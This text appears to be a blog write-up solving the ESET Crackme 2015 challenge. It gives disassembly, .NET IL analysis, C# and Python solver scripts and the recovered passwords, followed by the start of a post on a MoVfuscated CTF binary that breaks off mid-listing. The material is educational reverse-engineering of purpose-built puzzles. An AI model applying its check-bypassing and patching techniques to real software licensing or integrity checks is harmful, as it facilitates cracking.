esi, eax\r.text:00402404 push ecx\r.text:00402405 mov ecx, [ebp+var_4C]\r.text:00402408 mov [ebp+var_5C], esi\r.text:0040240B call toBase64\r.text:00402410 xor eax, eax\r.text:00402412 mov byte ptr [esi+edi-1], 0\rOkay, so the input is first converted to base64\n.text:00402420 loc_402420: ; CODE XREF: Edit_Handler+BB↑j\r.text:00402420 ; Edit_Handler+CB↓j\r.text:00402420 mov dl, al\r.text:00402422 and dl, 1\r.text:00402425 sub [eax+esi], dl\r.text:00402428 inc eax\r.text:00402429 cmp eax, edi\r.text:0040242B jl short loc_402420\rSubtracts the parity of the offset of each byte from the bytes.\n.text:0040242D mov eax, _loadLib_sha1 ; 0x00412EF0\r.text:00402432 mov edx, [eax+114h]\r.text:00402438 lea ecx, [eax+118h]\r.text:0040243E push ecx\r.text:0040243F push esi\r.text:00402440 call edx ; lstrcmpA\r.text:00402442 test eax, eax\r.text:00402444 jnz short loc_40246E\r.text:00402446 mov [ebp+var_4C], eax\r.text:00402449 push 5 ; unk\r.text:0040244B lea eax, [ebp+var_4C]\r.text:0040244E push eax ; buffer\r.text:0040244F push 0BB01h ; tag\r.text:00402454 push 2 ; cmd\r.text:00402456 call Send\rSo, the string is located at 0x00412EF0+0x118 which is resource 0xbb02\n.data:00413008 BB02 db 44h dup(?) ; DATA XREF: GetResources+B6↑o\rbb02 = bytearray(\u0026#34;020f0674311f64230178163c340f282e50\u0026#34;.decode(\u0026#34;hex\u0026#34;), \u0026#39;ascii\u0026#39;) for i in xrange(len(bb02)): bb02[i] ^= ord(\u0026#39;PIPE\u0026#39;[i \u0026amp; 3]) bb02[i] += i\u0026amp;1 print bb02.decode(\u0026#34;base64\u0026#34;) which outputs Devin Castle. So, Devin Castle is the first password\nThe Protocol  +-----------------+ Fetch Resource +-------------------------+\r| +-------------------------\u0026gt; | Thread2 |\r| GUI Thread | | (EsetCrackme2015.exe) |\r| |Length, Resource Data | |\r| | \u0026lt;------------------------+ |\r| | Notify Validation | |\r| +-------------------------\u0026gt; | |\r+-----------------+ +------------+------------+\r|\rCommand-2 | Mark Resource\r| Set last resource to id\rv\r+-------------------+ +------------+------------+\r| | | |\rTRUE | 0xbb01, 0xbb02, | | Thread1 |\r+-----------+ 0xbb03, 0xff01 | call [edi+0x406] | (Event Signaled) |\r| | marked? +\u0026lt;-------------------+ |\r| | | +-------------------------+\r| +---------+---------+\r| |\rv FALSE | +-----------------+ +------------------+\r+-------+---------+ | | | TRUE | |\r| | +--------\u0026gt;+ Last Resource +--------------\u0026gt;+ Extract drv.zip |\r| Congrats! | | 0xbb01? | | |\r| | | | +------------------+\r+-----------------+ +--------+--------+\r|\r| FALSE\r|\rv\r+--------+--------+ +--------------------------+\r+----------+ FALSE | | | |\r| RETURN | \u0026lt;-------------+ Last Resource | TRUE | Extract - |\r+----------+ | 0xaa10? +-------------\u0026gt; | |\r| | | 1. PunchCardReader |\r+-----------------+ | 2. PuncherMachine |\r| 3. PunchCard.bmp |\r| |\r+--------------------------+\rPuncherMachine Running DetectItEasy on PuncherMachine.exe it shows that its obfuscated by Obfuscar. The symbols are renamed and the interesting fact is that the sequence of statements are put into a FSM, i.e. the implicit jump to from the current statement to the next statement is controlled by a FSM.\nFor example, if the code contains\nstmt1; stmt2; stmt3;\nThe obfuscated code will look like\nstate = 6 for (;;) { switch (state ^ 5) { case 1: // stmt2;  state = 2; continue; case 7: // stmt3;  state = 0; continue; case 3: // stmt1;  state = 4; continue; default: goto finish; } } finish: Of course, the constants used for representing states won’t be this small.\nThe code first computes the MD5 of all Instance, Public, Static, and NonPublic methods in the assembly. The MD5 generated is 3C C0 21 F8 BC 62 3E C0 F5 45 0C 55 41 8B A1 20\nThe resources 0xFF01, 0xFF02 are fetched (command 1) and decrypted (AES Algorithm) using the above MD5 as the key. The decrypted contents of 0xFF02 is \u0026ldquo;95eceaa118dd081119e26be1c44da2cb\u0026rdquo;, a MD5 hash.\nThe program prompts for selecting an image. Once the image is selected, it calculates its MD5 hash and matches with the decrypted MD5 hash (0xFF02). If the hashes mismatch, the program displays “Calibration Error”. Otherwise, it fetches the resources 0xFF04 and 0xFF00 and decrypts them using the same key.\nThe resource 0xFF04 is a .NET DLL file. It contains two classes - DynMethod.DynMethodFactory and IlEmitHelp.ILEmitParticle. The resource 0xFF00 contains 86 64-bit integers.\nNow two textboxes appear with a button \u0026ldquo;Calibrate It\u0026rdquo;. Here is the Deobfuscated algorithm\nList\u0026lt;char\u0026gt; lstChars = new List\u0026lt;char\u0026gt;(); List\u0026lt;int\u0026gt; lstInts = new List\u0026lt;int\u0026gt;(); Hashtable H; delegate ulong HashIt(string); Button.Click { if (validate(text1.Text, text2.Text)) { // good jump  } else { MessageBox.Show(\u0026#34;Calibration Error!\u0026#34;, \u0026#34;Error\u0026#34;); } } /* * lstChars and lstInts are initialized when the MD5 of the image is validated */ void Init() { string temp = \u0026#34;0123456789ABCDEFGHIJKLMNOPQR/STUVWXYZabcdefghijklmnopqrstuvwxyz:#@\\\\\\\u0026#34;.\u0026lt;(+|$*);,%_\u0026gt;? -\u0026amp;\u0026#34;; for(int i = 0; i \u0026lt; temp.Length; ++i) lstChars.Add(temp[i]); int[] arr = new int[] { 0x200, 0x100, 0x80, 0x40, 0x20, 0x10, 8, 4, 2, 1, 0x900, 0x880, 0x840, 0x820, 0x810, 0x808, 0x804, 0x802, 0x801, 0x500, 0x480, 0x440, 0x420, 0x410, 0x408, 0x404, 0x402, 0x401, 0x300, 0x280, 0x240, 0x220, 0x210, 0x208, 0x204, 0x202, 0x201, 0xB00, 0xA80, 0xA40, 0xA20, 0xA10, 0xA08, 0xA04, 0xA02, 0xA01, 0xD00, 0xC80, 0xC40, 0xC20, 0xC10, 0xC08, 0xC04, 0xC02, 0xC01, 0x680, 0x640, 0x620, 0x610, 0x608, 0x604, 0x602, 0x601, 0x82, 0x42, 0x22, 0x12, 0xA, 6, 0x842, 0x812, 0x80A, 0x806, 0x442, 0x422, 0x412, 0x40A, 0x242, 0x222, 0x212, 0x20A, 0x206, 0, 0x400, 0x800 }; for (int i = 0; i \u0026lt; arr.Length; ++i) lstInts.Add(arr[i]); } bool validate(string str1, string str2) { List\u0026lt;uint\u0026gt; iList = new List\u0026lt;uint\u0026gt;(); for (int i = 0; i \u0026lt; str1.Length; i += 8) { iList.Add(Convert.ToInt32(str1.Substring(i, 8), 16)); } if (str2.Length \u0026gt; lstChars.Count) { return false; } HashIt computeHash = GetMethod(iList.toArray()); InitHashtable(); Hashtable A = new Hashtable(); for (int i = 0; i \u0026lt; lstChars.Count; ++i) { ulong hash = computeHash(i \u0026lt; str2.Length ? lstChars[i]+str2[i] : lstChars[i]); if (! H.containsKey(hash)) { return false; } A.Add(lstChars[i], H[hash]); } return true; } HashIt GetMethod(List\u0026lt;uint\u0026gt; lst) { MethodInfo methInfo = typeof(DynMethod.DynMethodFactory).GetMethod(\u0026#34;createMethod\u0026#34;); DynamicMethod dynMeth = methInfo.Invoke(null, new object[] { lst }); return dynMeth.CreateDelegate(typeof(HashIt)); } void InitHashtable() { H = new Hashtable(); byte[] data = GetDecryptedResource(0xFF00); for (int i = 0; i \u0026lt; lstChars.Count; ++i) { H.Add(BitConverter.ToUInt64(data, i*8), lstInts[i]); } } Now in DynMethodFactory.CreateMethod, we have\nFor all opcodes except break, a hashtable is created whose key consists of the hash and the corresponding value is an OpCodes instance. Here is the algorithm that maps an opcode to its hash\nunsigned hash(char* name) { unsigned ans = 0; for (int i = 0; name[i]; ++i) { ans += name[i]; ans += ans \u0026lt;\u0026lt; 10; ans ^= ans \u0026gt;\u0026gt; 6; } ans += ans \u0026lt;\u0026lt; 3; ans ^= ans \u0026gt;\u0026gt; 11; return ans + (ans \u0026lt;\u0026lt; 15); } Now the createMethod takes an array of unsigned ints and produces the following code. Let’s name the array arr and the hashtable as table\n nop\rldc.i8 0x2AAAAAAAAAAAAB67 ; int1\rstloc.0\rldc.i4.0\rstloc.1\rbr.s L0\rL1:\rnop\rldloc.0\rtable[arr[0]]\rldloc.1\rcallvirt [string!get_Chars]\rconv.u8\radd\rstloc.0\rldloc.0\rldc.i8 0x2AAAAAAAAAAAAB6F ; int2\rtable[arr[1]]\rstloc.0\rnop\rldloc.1\rldc.i4.1\radd\rstloc.1\rL0:\rldloc.1\rldarg.0\rcallvirt [string!get_Length]\rclt\rstloc.3\rldloc.3\rbrtrue.s L1\rget_Chars takes two parameters - string, offset and returns the character at the given offset. Clearly, arr[0] must be the hash of the instruction ldarg.0 as the first parameter must be a string.\nThe hashtable H\u0026rsquo;s keys are the contents of the decrypted resource 0xFF00. And each key is an unsigned int64. Notice that the integers labelled int1 and int2 differ by 8. So the candidate choices for arr[1] are ADD, MUL, OR. We cannot use SUB, XOR, DIV as the resulting value would decrease to less than 64 bits and no unary operators can be used as there are two uint64 operands on the stack.\nTo get the string str2 in validate routine, I have used bruteforce. Here\u0026rsquo;s my code\n// run.cs using System; using System.IO; using System.Reflection; using System.Reflection.Emit; public class CalibrationCode { delegate bool HashChecker(ulong hash); delegate ulong Hash(string s); static void Main() { OpCode[] candidates = { OpCodes.Add, OpCodes.Mul, OpCodes.Or }; var hashes = new ulong[86]; var set = \u0026#34;0123456789ABCDEFGHIJKLMNOPQR/STUVWXYZabcdefghijklmnopqrstuvwxyz:#@\\\\\\\u0026#34;.\u0026lt;(+|$*);,%_\u0026gt;? -\u0026amp;\u0026#34;; using (var fS = new FileStream(\u0026#34;FF00.bin_dec.bin\u0026#34;, FileMode.Open, FileAccess.Read)) { using (var binR = new BinaryReader(fS)) { for (int i = 0; i \u0026lt; 86; ++i) hashes[i] = binR.ReadUInt64(); } } HashChecker isHashPresent = (hash) =\u0026gt; { for (int i = 0; i \u0026lt; 86; ++i) if (hashes[i] == hash) return true; return false; }; var charAt = typeof(string).GetMethod(\u0026#34;get_Chars\u0026#34;); var len = typeof(string).GetMethod(\u0026#34;get_Length\u0026#34;); foreach (var op in candidates) { DynamicMethod dynMeth = new DynamicMethod(\u0026#34;Hash\u0026#34;, typeof(ulong), new Type[] { typeof(string) }); var ilGen = dynMeth.GetILGenerator(); ilGen.DeclareLocal(typeof(ulong), true); ilGen.DeclareLocal(typeof(int), true); ilGen.DeclareLocal(typeof(int), true); ilGen.Emit(OpCodes.Ldarg_0); ilGen.Emit(OpCodes.Call, len); ilGen.Emit(OpCodes.Stloc_2); ilGen.Emit(OpCodes.Ldc_I8, 3074457345618258791L); ilGen.Emit(OpCodes.Stloc_0); ilGen.Emit(OpCodes.Ldc_I4_0); ilGen.Emit(OpCodes.Stloc_1); Label l0 = ilGen.DefineLabel(); Label l1 = ilGen.DefineLabel(); ilGen.Emit(OpCodes.Br_S, l0); ilGen.MarkLabel(l1); ilGen.Emit(OpCodes.Ldarg_0); ilGen.Emit(OpCodes.Ldloc_1); ilGen.Emit(OpCodes.Call, charAt); ilGen.Emit(OpCodes.Conv_I8); ilGen.Emit(OpCodes.Ldloc_0); ilGen.Emit(OpCodes.Add); ilGen.Emit(OpCodes.Ldc_I8, 3074457345618258799L); ilGen.Emit(op); ilGen.Emit(OpCodes.Stloc_0); ilGen.Emit(OpCodes.Ldloc_1); ilGen.Emit(OpCodes.Ldc_I4_1); ilGen.Emit(OpCodes.Add); ilGen.Emit(OpCodes.Stloc_1); ilGen.MarkLabel(l0); ilGen.Emit(OpCodes.Ldloc_1); ilGen.Emit(OpCodes.Ldloc_2); ilGen.Emit(OpCodes.Blt_S, l1); ilGen.Emit(OpCodes.Ldloc_0); ilGen.Emit(OpCodes.Ret); Hash hashIt = (Hash) dynMeth.CreateDelegate(typeof(Hash)); // check it now.  string code = \u0026#34;\u0026#34;; for (int i = 0; i \u0026lt; set.Length; ++i) { for (int j = 0; j \u0026lt; set.Length; ++j) { string str = string.Format(\u0026#34;{0}{1}\u0026#34;, set[i], set[j]); if (isHashPresent(hashIt(str))) code += set[j]; } } Console.WriteLine(\u0026#34;[+] Using {0} =\u0026gt; {1}\u0026#34;, op.Name, code); } } } Which gives the output\nx0r19x91@x0r19x91 /cygdrive/c/Users/x0r19x91/Desktop/ESET/crackme $ ./run [+] Using add =\u0026gt; [+] Using mul =\u0026gt; Infant Jesus of Prague [+] Using or =\u0026gt; So, the value of str2 in validate routine is Infant Jesus of Prague which is the third password. For str1, we need the hash values of LDARG.0 and MUL\nExecuting hash() and concatenating, we get str1 - 0364ABE72D29C96C\nThe program now sends MarkCommand (2) for the resource 0xFF00 to the EsetCrackmePipe. Command2 means mark the resource in the marked array.\nNow a multiline textbox appears and a button labelled \u0026lsquo;Punch it!\u0026rsquo;. For each line in the multiline textbox, it encodes that line into an image and saves it with the name \u0026lsquo;punch_card_X.bmp\u0026rsquo; where X is the index of the line.\nPunchCardReader The program first computes the MD5 of its assembly - a26d11dee294284f38db8a724c119d74. Then in Form_Load event, it fetches the resource 0xFF05 (command 1) and decrypts (AES) using the MD5 as the key.\nThe resource 0xFF05 is another .NET DLL. In the click event of the \u0026ldquo;Read punch cards\u0026rdquo; button, the program first decodes the images (\u0026ldquo;punch_card_X.bmp\u0026rdquo;) generated by PuncherMachine. It then invokes the method returned by DynMethod.createMethod, using the decoded strings as arguments.\nIn createMethod, a hashtable is created with keys as IL opcode names, with the corresponding IL opcode instances. And a dynamic method is returned which contains\n.local uint\r.local uint\r.local uint\r.local uint\r.local uint\r.local uint\r.local byte[]\r.local uint\r.local bool\r.local bool\rnop\rldc.i4 57005\rstloc.0\rldc.i4 48879\rstloc.1\rldc.i4 51966\rstloc.2\rldc.i4 47806\rstloc.3\rldc.i4 64206\rstloc.s 4\rldloc.0\rldloc.1\rOPCODE[instr[0]] ; t0 = i[0](57005, 48879)\rldloc.2\rldloc.3\rOPCODE[instr[1]] ; t1 = i[1](51966, 47806)\rxor\rldloc.s 4\rxor\rldc.i4 -229612108\rxor\rstloc.s 5 ; t0 ^ t1 ^ 64206 ^ -229612108\rcall Encoding.ASCII\rldstr \u0026quot;ESET\u0026quot;\rcallvirt GetBytes\rstloc.s 6\rldloc.s 6\rldc.i4.0\rcall BitConverter.ToUInt32\rstloc.s 7 ; 0x54455345\rldloc.s 5\rldloc.s 7\rceq\rldc.i4.0\rceq\rstloc.s 9\rldloc.s 9\rbrtrue.s L0\rldc.i4.1\rstloc.s 8\rbr.s L1\rL0:\rldc.i4.0\rstloc.s 8\rbr.s L1\rL1:\rldloc.s 8\rOPCODE[instr[2]]\rSo, two things are clear now. First the number of instructions is 3, i.e., we have to enter three lines in the PuncherMachine. Secondly, the last instruction (instr[2]) has to be ret\nNow, the task is, find operators O1 and O2 such that the following holds\nO1(57005, 48879) ^ O2(51966, 47806) ^ 64206 ^ -229612108 == ‘ESET’[::-1].encode(‘hex’)\ri.e., O1(57005, 48879) ^ O2(51966, 47806) ^ 64206 ^ -229612108 == 0x54455345\r=\u0026gt; O1(57005, 48879) ^ O2(51966, 47806) == 64206 ^ -229612108 ^ 0x54455345\r=\u0026gt; O1(57005, 48879) ^ O2(51966, 47806) == 0xa615cc3f\rusing System; using System.Reflection; using System.Reflection.Emit; public class FindInstructions { delegate bool Solver(); static void Main() { OpCode[] candidates = { OpCodes.Add, OpCodes.Mul, OpCodes.Or, OpCodes.Xor }; foreach (var op1 in candidates) { foreach (var op2 in candidates) { var methSolve = new DynamicMethod(\u0026#34;Solver\u0026#34;, typeof(bool), new Type[0]); var ilGen = methSolve.GetILGenerator(); ilGen.Emit(OpCodes.Ldc_I4, 57005); ilGen.Emit(OpCodes.Ldc_I4, 48879); ilGen.Emit(op1); ilGen.Emit(OpCodes.Ldc_I4, 51966); ilGen.Emit(OpCodes.Ldc_I4, 47806); ilGen.Emit(op2); ilGen.Emit(OpCodes.Xor); ilGen.Emit(OpCodes.Ldc_I4, 0xa615cc3f); ilGen.Emit(OpCodes.Ceq); ilGen.Emit(OpCodes.Ret); Solver solve = (Solver) methSolve.CreateDelegate(typeof(Solver)); if (solve()) { Console.WriteLine( \u0026#34;First OpCode - {0}\\nSecond OpCode - {1}\u0026#34;, op1.Name, op2.Name ); } } } } } Executing it, we get the first opcode - mul and the second opcode - add\nSo, the first and second instructions are MUL, and ADD. Now we have to enter the strings - MUL, ADD, RET into the PuncherMachine to get three punch cards.\nNow PunchCardReader sends command 2 (Mark Resource) for resource 0xFF01, and displays a message dialog \u0026ldquo;Verification passed \u0026hellip;\u0026rdquo;\u0026quot;\nNow that we have marked resources 0xBB01 and 0xFF01, we still have resources 0xBB02 and 0xBB03 left to be marked.\nDecoding resource 0xBB01 by xoring with the key \u0026ldquo;PIPE\u0026rdquo;, we get three hashes.\nIf the hash of the second password matches 0F30181CF3A9857360A313DB95D5A169BED7CC37 and that of the third password matches 0B6A1C6651D1EB5BD21DF5921261697AA1593B7E, the resources 0xBB02 and 0xBB03 get marked.\nTill now I’ve used a bitmap 600x259 consisting of a white background and bypassing IEnumerable.SequenceEquals for PuncherMachine, forcing it to return true while validating the image.\nThe only way to send a mark resource message for resources 0xBB02 and 0xBB03 is by matching the respective hashes. Finding by brute force is unacceptable.\nSo, the passwords must be encoded in the program itself. The crackme driver decodes the resources 0xAA02, 0xAA06 using RC4, the key is 3531_4ever\nThe driver creates a device \\Device\\45736574 i.e., \u0026quot;Eset\u0026quot;.encode(\u0026quot;hex\u0026quot;) and the main executable on receiving 0xAA10 mark command, extracts the resource 0x155 with name \u0026ldquo;PunchCard.bmp\u0026rdquo; into the path \\?\\GLOBALROOT\\Device\\45736574\\PunchCard.bmp\nThe Driver The AddDevice routine of the driver extension sets up a FAT disk. In LoadFatEntries, it queries the FAT params like \u0026ldquo;Parameters\u0026rdquo;, \u0026ldquo;DiskSize\u0026rdquo;, etc. from the Registry otherwise sets up with default values. Default Disk size is 0x1E00000 bytes or 30MB. RootDirectoryEntries is set to 0x200 and 2 sectors per cluster. It then spawns two threads.\nThe first thread sends a fetch command for resource 0xaa02 (ESETConst), decrypts it with rc4 key 3531_4ever and spawns a new thread which reads the value of \u0026ldquo;ESETConst\u0026rdquo; registry key and stores in a global variable str (at end of data section)\nThread2 initializes another virtual machine\n.text:9C6B5329 call ds:ExAllocatePool\r.text:9C6B532F mov ecx, [ebp+var_14]\r.text:9C6B5332 mov [ecx+64h], eax\r.text:9C6B5335 mov edx, [ebp+var_14]\r.text:9C6B5338 mov dword ptr [edx+68h], 21ACh\r.text:9C6B533F push 21ACh ; MaxCount\r.text:9C6B5344 push offset vm_code ; Src\r.text:9C6B5349 mov eax, [ebp+var_14]\r.text:9C6B534C mov ecx, [eax+64h]\r.text:9C6B534F push ecx ; Dst\r.text:9C6B5350 call memcpy\r.text:9C6B5355 add esp, 0Ch\r.text:9C6B5358 push 21ACh ; size\r.text:9C6B535D mov edx, [ebp+var_14]\r.text:9C6B5360 mov eax, [edx+64h]\r.text:9C6B5363 push eax ; buf\r.text:9C6B5364 call RC4Decrypt\r.text:9C6B5369 push 2B5h ; NumberOfBytes\r.text:9C6B536E push 0 ; PoolType\r.text:9C6B5370 call ds:ExAllocatePool\r.text:9C6B5376 mov ecx, [ebp+var_14]\r.text:9C6B5379 mov [ecx+70h], eax\r.text:9C6B537C mov edx, [ebp+var_14]\r.text:9C6B537F mov dword ptr [edx+74h], 2B5h\r.text:9C6B5386 push 2B5h ; MaxCount\r.text:9C6B538B push offset code_to_exec ; Src\r.text:9C6B5390 mov eax, [ebp+var_14]\r.text:9C6B5393 mov ecx, [eax+70h]\r.text:9C6B5396 push ecx ; Dst\r.text:9C6B5397 call memcpy\r.text:9C6B539C add esp, 0Ch\r.text:9C6B539F push 2B5h ; size\r.text:9C6B53A4 mov edx, [ebp+var_14]\r.text:9C6B53A7 mov eax, [edx+70h]\r.text:9C6B53AA push eax ; buf\r.text:9C6B53AB call RC4Decrypt\rSo, it sets up offset +0x64 with the VM and +0x70 with the code to execute on the vm. It then fetches resource 0xaa06 which seems to be some patch to the code to execute. After decrypting 0xaa06 (rc4)\n.text:9C6B561E mov eax, [ebp+Length]\r.text:9C6B5621 push eax ; MaxCount\r.text:9C6B5622 mov ecx, [ebp+P]\r.text:9C6B5625 push ecx ; Src\r.text:9C6B5626 mov edx, [ebp+var_14]\r.text:9C6B5629 mov eax, [edx+70h]\r.text:9C6B562C add eax, 26Dh\r.text:9C6B5631 push eax ; Dst\r.text:9C6B5632 call memcpy\rThe patched code is placed at +0x26d wrt the code to execute. Here’s the script that saves the patched code\n#!/usr/bin/env python from Crypto.Cipher import ARC4 key = \u0026#39;3531_4ever\u0026#39; d = open(\u0026#34;0xaa06.bin\u0026#34;, \u0026#34;rb\u0026#34;).read() d = ARC4.new(key).decrypt(d) code = \u0026#39;\u0026#39;\u0026#39;CAE23DEDCDE3016FB7080893AA91A5E3F599D4A36E81E7013512F4D971C64AF57B4428D746C58D05256B06684CB6CE8BDCDB85C77C1FC782C06150714B5C1AD028067029AC959DDEA4BF3F1210EAFA3100CC38BC08D90E933537D8683CD5707544A2D586B3257F7CDBE684B3F65F564A0F699A4C0F0C548D6352FF91DE8A13BFB8E13BDFBFDD3483CB3E93F7549251163DE2FDD7071D63D25EB771AB97B2DA722506805CE813D4E6066970E6E02C2C1823C4A58F2AB2641B87F784D84A7CF5B65B912EC8E5E10A1E5D5C52E382DF2BEB32CC673F6D6843D39615DBEC15095C5FDD20375678DFD28589FD01A92F3E47DCFABE014BC07C336D4A69489E07902A6E4CE44B760705FB531FECC745FCE1EC247A1698D8B186CCF36AF58FA01A1A4EE61926488B72B26B3EDF0B578CB25EE9359B99113A62FD17B03410A84D67239D157E01886B1168C10D064B909ACBFB123776E2F80E6C366BD63CC8EE86DCD754BF023FA2CD7ACD6C4A56643A26D1A29128518C9866EF0EBDF6407653A475A5DB1544CEFCFC33EE441A565975CA1CEC192B0D2A35B07FD68A0D12CBAA45F01490948464D15326F03C489F3D65B0E7F9A103236356CBAE883B0C4CD5348B80B08344CC61CA3E3DB4E1D49D7EA16BAC68E5AAD801AAF7B752A75B18BE07989BEA79D832F435F08B25AD387A8B893470CD0FD7748B5C3D13C63A5BF05DC484836BE4516D8D0D162E184311894E12E5A7BDAA8AFE219DFF6CE97621D9FDCF3B3E388A354BADB6231787E081AAF0FE26EA4AACCF1F5EF7632B4A33104B2C593014C639F71735179FDD5899394FA9D69BC217E578E961DE0769DB942855E1E2FDB608ADE61D30D7750F2CA67E839006372B71250DE6052293E108D6C62A884096513541464CDC38C2EBEE985AF75B6E211BA8CE4AEC8C2EC6FF5C7FD86EA27C65191A5E10CC179220622AD66AB656E4E020552DC14B8F544EB0\u0026#39;\u0026#39;\u0026#39; code = code.decode(\u0026#39;hex\u0026#39;) code = ARC4.new(key).decrypt(code) code = list(code) for i in xrange(len(d)): code[0x26d+i] = d[i] open(\u0026#34;code.bin\u0026#34;, \u0026#39;wb\u0026#39;).write(\u0026#39;\u0026#39;.join(code)) It seems like the size of the VM (0x2b5) is placed at offset +0x2. Here’s the Driver VM layout\nstruct res_t { char sign[2]; int size; int code_off; int data_off; int bModuleLoaded; char stream[]; } __attribute__((packed)); 00 ldr X, 0\rcmp.eq X, R12\r04 ldr X, 0x8a\rjmp.cc X\r0a ldr X, 0\rcmp.eq X, R13\r0e ldr X, 0x11e\rjmp.cc X\r14 ldr X, R12\rstr X, R2\r17 ldr X, \u0026amp;[0x295]\rstr X, R3\r1e ldr X, \u0026amp;[0x268]\rstr X, R4\r25 ldr X, R2\rstr X, R5\r28 ldr X, R13\radd R5, X\r2b ldr X, R3\rstr X, R14\r2e ldr X, \u0026amp;[0x291]\rstr X, R0\r35 ldr X, dword ptr [R0]\radd R14, X\r38 ldr X, R4\rstr X, R15\r3b ldr X, 0x4\radd R15, X\r3f ldr X, R5\rcmp.neq X, R2\r42 ldr X, 0x4b\rjmp.cc X\r48 ldr X, R12\rstr X, R2\r4b ldr X, R15\rcmp.neq X, R4\r4e ldr X, 0x5b\rjmp.cc X\r54 ldr X, \u0026amp;[0x268]\rstr X, R4\r5b ldr X, R14\rcmp.eq X, R3\r5e ldr X, 0x100\rjmp.cc X\r64 ldr X, byte ptr [R2]\rstr X, R0\r67 ldr X, byte ptr [R3]\rxor R0, X\r6a ldr X, 0x1\radd R0, X\r6e ldr X, 0x1\rrolb R0, X\r72 ldr X, byte ptr [R4]\rxor R0, X\r75 ldr X, R0\rstr X, byte ptr [R3]\r78 ldr X, 0x1\radd R2, X\r7c ldr X, 0x1\radd R3, X\r80 ldr X, 0x1\radd R4, X\r84 ldr X, 0x3f\rjmp X\r8a ldr X, \u0026amp;[0x271]\rstr X, R3\r91 ldr X, \u0026amp;[0x268]\rstr X, R4\r98 ldr X, R3\rstr X, R14\r9b ldr X, \u0026amp;[0x26d]\rstr X, R0\ra2 ldr X, dword ptr [R0]\radd R14, X\ra5 ldr X, R4\rstr X, R15\ra8 ldr X, 0x4\radd R15, X\rac ldr X, R15\rcmp.neq X, R4\raf ldr X, 0xbc\rjmp.cc X\rb5 ldr X, \u0026amp;[0x268]\rstr X, R4\rbc ldr X, R14\rcmp.eq X, R3\rbf ldr X, 0xe8\rjmp.cc X\rc5 ldr X, 0\rstr X, R0\rc9 ldr X, byte ptr [R3]\rxor R0, X\rcc ldr X, 0x1\radd R0, X\rd0 ldr X, 0x1\rrolb R0, X\rd4 ldr X, byte ptr [R4]\rxor R0, X\rd7 ldr X, R0\rstr X, byte ptr [R3]\rda ldr X, 0x1\radd R3, X\rde ldr X, 0x1\radd R4, X\re2 ldr X, 0xac\rjmp X\re8 ldr X, \u0026amp;[0x26d]\rstr X, R0\ref ldr X, dword ptr [R0]\rstr X, R0\rf2 ldr X, R0\rpush X\rf4 ldr X, \u0026amp;[0x271]\rpush X\rfa ldr X, 0x112\rjmp X\r100 ldr X, \u0026amp;[0x291]\rstr X, R0\r107 ldr X, dword ptr [R0]\rstr X, R0\r10a ldr X, R0\rpush X\r10c ldr X, \u0026amp;[0x295]\rpush X\r112 ldr X, R11\rpush X\r114 ldr X, R10\rpush X\r116 emulate\r11e hlt\rThe arguments are - R12 contains str (the global variable containing \u0026ldquo;ESETConst\u0026rdquo; value), R13 contains len(str). The notation \u0026amp;[X] defines the address of offset X\nSo, if nothing is passed to \u0026ldquo;ESETConst\u0026rdquo;, the control jumps to 0x8a. This loop decrypts a 0x12 byte key\nl = [0x82, 0x99, 0x8f, 0x92, 0x11, 0x9e, 0x18, 0x94, 0xb1, 0x8e, 0x8f, 0x11, 0x16, 0x9c, 0x11, 0x1a, 0x16, 0x9d, 0xa8] def rol(x): return (x \u0026lt;\u0026lt; 1 | x \u0026gt;\u0026gt; 7) \u0026amp; 0xff k = \u0026#39;ETSE\u0026#39; for i in xrange(len(l)): t = rol(l[i]+1) l[i] = chr(ord(k[i\u0026amp;3])^t) print \u0026#39;\u0026#39;.join(l) It prints out Barbakan Krakowski which is the second password!\n Solved Finally!\n","date":"2019-11-16T00:00:00Z","permalink":"http://localhost:1313/post/eset-crackme-challenge/","title":"ESET Crackme Challenge"},{"content":"I\u0026rsquo;ll be analyzing another MoVfuscated binary, from Swamp CTF 2019 using IDA Free\nDeep on the web, I discovered a secret key validation.\nIt appeared to be from the future, and it only had one sentence: \u0026ldquo;Risk speed for security\u0026rdquo;.\nSomething seems fishy, you should try to break the key and find the secret inside!\n-= Created by noopnoop =-\nWe know that the MoVfuscator stack consists of an array of addresses.\nLet stack[i] store the value \u0026amp;A[i]. Then we have the invariant stack[i]-\u0026amp;stack[i] == 0x200064\nfp and NEW_STACK are pointers to the array stack. fp denotes the frame pointer, and NEW_STACK denotes the stack top pointer.\nWe also know that the stack grows towards lower address. So, how do we push and pop ?\nPush  \u0026amp;stack[i] = stack[i] - 0x200064 \u0026amp;stack[i+1] = \u0026amp;stack[i] - 4 = stack[i] - 0x200068 stack[i+1] = *(stack[i] - 0x200068) stack[i+2] = *(stack[i+1] - 0x200068) ... Pop  \u0026amp;stack[i] = stack[i] - 0x200064 \u0026amp;stack[i-1] = \u0026amp;stack[i] + 4 = stack[i] - 0x200060 stack[i-1] = *(stack[i] - 0x200060) stack[i-2] = *(stack[i-1] - 0x200060) ... Function Call User Defined Functions It pushes the return address, and then sets the target variable to branch_temp. So, the above sequence, skips through until it reaches 0x805036A\nExternal Functions These functions are called through a SIGSEGV.\nEvery movfuscator instruction except the ALU ops are conditional. That is the operation depends on on variable. So, how are jumps, conditionals implemented ?\nJumps and conditionals are implemented using a target variable. Whenever you see target being compared with a virtual address, you can tell it is the beginning of a basic block.\nLoops\nFor example, let\u0026rsquo;s consider the following for loop  for (int i = 0; i \u0026lt; 10; i++) { // ...  } It would compile to something like this\nmov i, 0 jmp L2 L1: ; ... add i, 1 L2: cmp i, 10 jl L1 And the movfuscator equivalent is\nmaster_loop: ; ... mov target, offset L2 L1: cmp target, offset L1 jnz L2 ; ... loop body ... mov target, offset L2 L2: cmp target, offset L2 jnz next_block ; ... loop check ... mov target, offset L1 ; ... remaining code ... ; throw a SIGILL to jump to master_loop In fact, there is only one loop (the master_loop). So, it\u0026rsquo;s the target variable that controls the flow.\nThe master_loop executes the following\nmaster_loop: mov esp, NEW_STACK mov eax, sesp mov edx, 4 add eax, edx push eax push dword [eax-4] push 0x804854e ; return address after calling 0x805036a mov target, 0x805036a ; main() ; ... Every basic block begins with the following sequence of instructions\nmov eax, target cmp eax, 0xABCD For example, The block is executed if the comparison is true. The function prologue consists of a sequence of register saves into the stack.\n.text:08050544 mov eax, fp .text:08050549 mov stack_temp, eax .text:0805054E mov eax, offset NEW_STACK .text:08050553 mov edx, on .text:08050559 mov data_p, eax .text:0805055E mov eax, sel_data[edx*4] .text:08050565 mov edx, NEW_STACK .text:0805056B mov edx, [edx-200068h] .text:08050571 mov [eax], edx .text:08050573 mov eax, NEW_STACK .text:08050578 mov edx, on .text:0805057E mov data_p, 